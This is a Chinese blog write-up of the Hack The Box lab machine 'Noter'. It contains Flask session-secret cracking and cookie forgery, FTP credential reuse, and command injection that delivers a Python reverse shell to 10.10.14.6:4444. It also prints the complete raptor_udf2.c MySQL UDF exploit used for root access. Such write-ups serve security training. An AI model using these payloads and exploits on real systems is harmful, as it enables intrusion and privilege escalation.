@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Noter - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Noter靶场信息  靶场类型  信息收集Nmap┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.160 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-05-22 02:50 EDT Nmap scan rep">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Noter - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Noter靶场信息  靶场类型  信息收集Nmap┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.160 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-05-22 02:50 EDT Nmap scan rep">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/49242766-f992-44fc-9135-7949fb2c6022.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/ea52bbc7-29c8-4f95-a033-7cab8f2bef09.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/7dbe01f0-60f6-4e5a-920c-53842065ecc1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/e62c4c4e-800d-4910-af2a-133e3971cd73.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/24094af1-07c1-4ddb-ad25-d6136d66519b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/f34d5587-7133-429e-907f-0b41e97ed59e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/718e7b0b-4fbe-4cb5-abdf-2b0537ce5738.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/77f4c3ac-9bd0-4c0b-a800-77e6fb4289a9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/5affb9ec-0cce-4e71-addc-0854e5d4e141.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/82860798-7702-4c98-a8a3-8a448bc11f59.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/c4c10889-b04a-44b9-be62-cfb99dd2c1a9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/0bc5d4c6-8e6a-46ac-828c-5ffb0f5c5836.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/050dc532-2ff3-485e-9056-ead7138cfefe.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/6ea11c9f-40e3-40f4-854e-6d1cd51160b4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/f7b6070e-6a2f-4877-abad-d8d819ea6510.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/0923d419-71e3-4c98-9574-4de9e2439cb1.png">
+<meta property="article:published_time" content="2022-05-22T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:47:56.654Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/49242766-f992-44fc-9135-7949fb2c6022.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Noter - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Noter - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-05-22T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-05-22
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Noter"><span class="post-toc-text">Hackthebox - Noter</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Medium/Hackthebox-Noter"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Noter - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-05-22 19:38:36" datetime="2022-05-22T11:38:36.000Z"  itemprop="datePublished">2022-05-22</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Noter"><a href="#Hackthebox-Noter" class="headerlink" title="Hackthebox - Noter"></a>Hackthebox - Noter</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/49242766-f992-44fc-9135-7949fb2c6022.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/ea52bbc7-29c8-4f95-a033-7cab8f2bef09.png" class>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.160
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-22 02:50 EDT
+Nmap scan report for 10.10.11.160
+Host is up (0.12s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
+|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
+|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
+5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title: Noter
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=5/22%OT=21%CT=1%CU=41426%PV=Y%DS=2%DC=T%G=Y%TM=6289DD5
+OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
+OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 3389/tcp)
+HOP RTT       ADDRESS
+1   126.10 ms 10.10.14.1
+2   126.30 ms 10.10.11.160
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.63 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/7dbe01f0-60f6-4e5a-920c-53842065ecc1.png" class>
+
+<p>正如名字记录，这是一台笔记相关的靶机</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/e62c4c4e-800d-4910-af2a-133e3971cd73.png" class>
+
+<p>这里用 Wappalyzer 可以看到是一台 Flask 相关的靶机</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/24094af1-07c1-4ddb-ad25-d6136d66519b.png" class>
+
+<p>直接登陆提示的是 <code>Invalid credentials</code> ，这里也有注册口，先去注册个账号看看</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/f34d5587-7133-429e-907f-0b41e97ed59e.png" class>
+
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/718e7b0b-4fbe-4cb5-abdf-2b0537ce5738.png" class>
+
+<p>注册一个账号后，使用错误的密码登陆，提示的是 <code>Invalid login</code> ，那就意味着用户名可以被爆破，在抓继续查看的同时，我们先去爆破用户名看看</p>
+<p>使用用户名字典 &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;cirt-default-usernames.txt，然后使用 Burp 抓包进行爆破</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/77f4c3ac-9bd0-4c0b-a800-77e6fb4289a9.png" class>
+
+<p>最后得到了一个用户名 blue</p>
+<p>然后使用我们注册的账户进行登陆</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/5affb9ec-0cce-4e71-addc-0854e5d4e141.png" class>
+
+<p>倒是没看到什么有用的东西</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/82860798-7702-4c98-a8a3-8a448bc11f59.png" class>
+
+<p>cookie 处 发现了一个 JWT Token，拿去解密</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/c4c10889-b04a-44b9-be62-cfb99dd2c1a9.png" class>
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><blockquote>
+<p><a href="https://github.com/Paradoxis/Flask-Unsign" target="_blank" rel="noopener">https://github.com/Paradoxis/Flask-Unsign</a></p>
+</blockquote>
+<p>既然确定是 Flask 并且有 JWT 了，那就先暴力破解 JWT Token 的密钥吧</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/Flask-Unsign-master]
+└─# flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval --cookie &#39;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibHVjaWZpZWwifQ.YonkHw.yXozzyS_yg75iFARMutm6Be2D64&#39;
+[*] Session decodes to: {&#39;logged_in&#39;: True, &#39;username&#39;: &#39;lucifiel&#39;}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 17152 attempts
+b&#39;secret123&#39;
+</code></pre>
+<p>接着使用我们得到的密钥 secret123 和用户名 blue 去生成一段 JWT Token 吧</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/Flask-Unsign-master]
+└─# flask-unsign --sign --cookie &quot;{&#39;logged_in&#39;: True, &#39;username&#39;: &#39;blue&#39;}&quot; --secret &#39;secret123&#39;
+eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yonkfg.c45FeiSpfEgpBTGIvOACAJVXKbk
+</code></pre>
+<p>接着替换我们的 JWT Token 后，刷新页面</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/0bc5d4c6-8e6a-46ac-828c-5ffb0f5c5836.png" class>
+
+<p>我们成功进入了 blue 用户的后台</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/050dc532-2ff3-485e-9056-ead7138cfefe.png" class>
+
+<p>我们注意到，在这篇文章里，ftp_admin 用户有一份笔记，大意是说我们可以访问 FTP，并且给了我们一个账号密码</p>
+<pre><code class="bash">username = blue
+password = blue@Noter!
+</code></pre>
+<p>去登陆</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ftp 10.10.11.160                                                                           
+Connected to 10.10.11.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.160:root): blue
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</code></pre>
+<p>成功登陆了</p>
+<pre><code class="bash">ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
+-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf
+226 Directory send OK.
+ftp&gt; get policy.pdf
+local: policy.pdf remote: policy.pdf
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for policy.pdf (12569 bytes).
+226 Transfer complete.
+12569 bytes received in 0.00 secs (54.9850 MB/s)
+</code></pre>
+<p>这里看到有一个名为 policy.pdf 的文件，给下载下来</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/6ea11c9f-40e3-40f4-854e-6d1cd51160b4.png" class>
+
+<p>在创建密码的第四条提到了</p>
+<pre><code class="bash">Default user-password generated by the application is in the format of &quot;username@site_name!&quot; (This applies to all your applications)
+</code></pre>
+<p>这里的意思是，默认用户密码的格式是 username@sie_name!</p>
+<p>按照我们当前的情况，并且管理员是 ftp_admin 的情况下，那就得到了一个账号密码</p>
+<pre><code class="bash">username = ftp_admin
+password = ftp_admin@Noter!
+</code></pre>
+<p>继续登陆 ftp</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ftp 10.10.11.160
+Connected to 10.10.11.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.160:root): ftp_admin
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</code></pre>
+<p>登陆成功</p>
+<pre><code class="bash">ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
+-rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
+226 Directory send OK.
+ftp&gt; get app_backup_1635803546.zip
+local: app_backup_1635803546.zip remote: app_backup_1635803546.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).
+226 Transfer complete.
+25559 bytes received in 0.13 secs (193.4986 kB/s)
+ftp&gt; get app_backup_1638395546.zip
+local: app_backup_1638395546.zip remote: app_backup_1638395546.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).
+226 Transfer complete.
+26298 bytes received in 0.13 secs (193.9745 kB/s)
+</code></pre>
+<p>这里有两个 zip 文件，我们下载解压后，发现里面的结构是一样的，进行一下比较</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# diff ./1/app.py ./2/app.py   
+17,18c17,18
+&lt; app.config[&#39;MYSQL_USER&#39;] = &#39;root&#39;
+&lt; app.config[&#39;MYSQL_PASSWORD&#39;] = &#39;Nildogg36&#39;
+</code></pre>
+<p>我们得到了一个 mysql 的账号密码</p>
+<pre><code class="bash">username = root
+password = Nildogg36
+</code></pre>
+<pre><code class="bash">                        rand_int = random.randint(1,10000)
+            command = f&quot;node misc/md-to-pdf.js  $&#39;{note[&#39;body&#39;]}&#39; {rand_int}&quot;
+            subprocess.run(command, shell=True, executable=&quot;/bin/bash&quot;)
+</code></pre>
+<p>在 app_backup_1638395546.zip 的 <a href="http://app.py/" target="_blank" rel="noopener">app.py</a> 的第 283 行，我们看到了一个 RCE 漏洞</p>
+<p>填入我们的 Shell 语句</p>
+<pre><code class="bash">url = request.form[&#39;url&#39;]
+
+            status, error = parse_url(url)
+
+            if (status is True) and (error is None):
+                try:
+                    r = pyrequest.get(url,allow_redirects=True)
+                    rand_int = random.randint(1,10000)
+                    command = f&quot;node misc/md-to-pdf.js  $&#39;{r.text.strip()}&#39; {rand_int}&quot;
+                    subprocess.run(command, shell=True, executable=&quot;/bin/bash&quot;)
+</code></pre>
+<p>通过这部分代码，我们构造了一段 POC</p>
+<p>我们创建一个名为 <a href="http://exploit.md/" target="_blank" rel="noopener">exploit.md</a> 的文件</p>
+<pre><code class="bash">&#39;;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.6&quot;,4444)); os.dup2( s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39; # &#39;
+</code></pre>
+<p>接着使用 NC 监听一个端口</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+</code></pre>
+<p>然后使用 python3 打开一个 http 服务</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+<p>然后去页面上访问一下</p>
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/f7b6070e-6a2f-4877-abad-d8d819ea6510.png" class>
+
+<img src="/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/0923d419-71e3-4c98-9574-4de9e2439cb1.png" class>
+
+<p>填入我们的 shell 地址，然后执行</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.160] 53994
+$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+svc@noter:~/app/web$ whoami&amp;&amp;id
+whoami&amp;&amp;id
+svc
+uid=1001(svc) gid=1001(svc) groups=1001(svc)
+</code></pre>
+<p>成功拿到一个 user 权限</p>
+<pre><code class="bash">svc@noter:/home$ cat /home/svc/user.txt
+cat /home/svc/user.txt
+ed6e3a8ea6c35a17e3d63a425cb95c11
+</code></pre>
+<p>成功拿到一个 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>我们之前获得过一个 mysql 的凭证，这应该是一个提示，去看看进程</p>
+<pre><code class="bash">svc@noter:~/app/web$ mysql -V
+mysql -V
+mysql  Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
+</code></pre>
+<p>咱们知道了 mysql 的版本，然后搜索一下 mysql udf</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# searchsploit mysql udf
+------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------ ---------------------------------
+MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                                      | linux/local/1181.c
+MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                     | linux/local/1518.c
+MySQL 4/5/6 - UDF for Command Execution                                                                     | linux/local/7856.txt
+------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>应该是第二个了</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# locate linux/local/1518.c
+/usr/share/exploitdb/exploits/linux/local/1518.c
+</code></pre>
+<p>把 exp 给保存到桌面</p>
+<pre><code class="bash">/*
+ * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
+ *
+ * raptor_udf2.c - dynamic library for do_system() MySQL UDF
+ * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
+ *
+ * This is an helper dynamic library for local privilege escalation through
+ * MySQL run with root privileges (very bad idea!), slightly modified to work 
+ * with newer versions of the open-source database. Tested on MySQL 4.1.14.
+ *
+ * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
+ *
+ * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
+ * for the security vulnerabilities in the handling of User Defined Functions
+ * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further
+ * details, please refer to:
+ *
+ * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
+ * http://www.wisec.it/vulns.php?page=4
+ * http://www.wisec.it/vulns.php?page=5
+ * http://www.wisec.it/vulns.php?page=6
+ *
+ * &quot;UDFs should have at least one symbol defined in addition to the xxx symbol 
+ * that corresponds to the main xxx() function. These auxiliary symbols 
+ * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and 
+ * xxx_add() functions&quot;. -- User Defined Functions Security Precautions 
+ *
+ * Usage:
+ * $ id
+ * uid=500(raptor) gid=500(raptor) groups=500(raptor)
+ * $ gcc -g -c raptor_udf2.c
+ * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+ * $ mysql -u root -p
+ * Enter password:
+ * [...]
+ * mysql&gt; use mysql;
+ * mysql&gt; create table foo(line blob);
+ * mysql&gt; insert into foo values(load_file(&#39;/home/raptor/raptor_udf2.so&#39;));
+ * mysql&gt; select * from foo into dumpfile &#39;/usr/lib/raptor_udf2.so&#39;;
+ * mysql&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;;
+ * mysql&gt; select * from mysql.func;
+ * +-----------+-----+----------------+----------+
+ * | name      | ret | dl             | type     |
+ * +-----------+-----+----------------+----------+
+ * | do_system |   2 | raptor_udf2.so | function |
+ * +-----------+-----+----------------+----------+
+ * mysql&gt; select do_system(&#39;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#39;);
+ * mysql&gt; \! sh
+ * sh-2.05b$ cat /tmp/out
+ * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
+ * [...]
+ *
+ * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
+ *
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
+
+typedef struct st_udf_args {
+    unsigned int        arg_count;    // number of arguments
+    enum Item_result    *arg_type;    // pointer to item_result
+    char             **args;        // pointer to arguments
+    unsigned long        *lengths;    // length of string args
+    char            *maybe_null;    // 1 for maybe_null args
+} UDF_ARGS;
+
+typedef struct st_udf_init {
+    char            maybe_null;    // 1 if func can return NULL
+    unsigned int        decimals;    // for real functions
+    unsigned long         max_length;    // for string functions
+    char            *ptr;        // free ptr for func data
+    char            const_item;    // 0 if result is constant
+} UDF_INIT;
+
+int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
+{
+    if (args-&gt;arg_count != 1)
+        return(0);
+
+    system(args-&gt;args[0]);
+
+    return(0);
+}
+
+char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{
+    return(0);
+}
+
+// milw0rm.com [2006-02-20]
+</code></pre>
+<p>很完善的 exp 啊，还给了教程</p>
+<p>我们把 exp 上传上去</p>
+<p>然后按照 exp 里的教程，一步步执行</p>
+<pre><code class="bash">$ cd /tmp
+$ gcc -g -c raptor_udf2.c
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o $ raptor_udf2.so raptor_udf2.o -lc
+$ mysql -u root -p # root:Nildogg36
+MariaDB [(none)]&gt; use mysql;
+MariaDB [mysql]&gt; create table foo(line blob);
+MariaDB [mysql]&gt; insert into foo values(load_file(&#39;/tmp/raptor_udf2.so&#39;));
+MariaDB [mysql]&gt; show variables like &#39;%plugin%&#39;;
+MariaDB [mysql]&gt; select * from foo into dumpfile &#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so&#39;;
+MariaDB [mysql]&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;;
+MariaDB [mysql]&gt; select * from mysql.func;
+MariaDB [mysql]&gt; select do_system(&#39;cat /root/root.txt &gt; /tmp/flag.txt;chown svc:svc /tmp/flag.txt&#39;);
+MariaDB [mysql]&gt; \! sh
+$ cat /tmp/flag.txt
+</code></pre>
+<p>然后就可以得到 root 权限的 flag 文件了</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
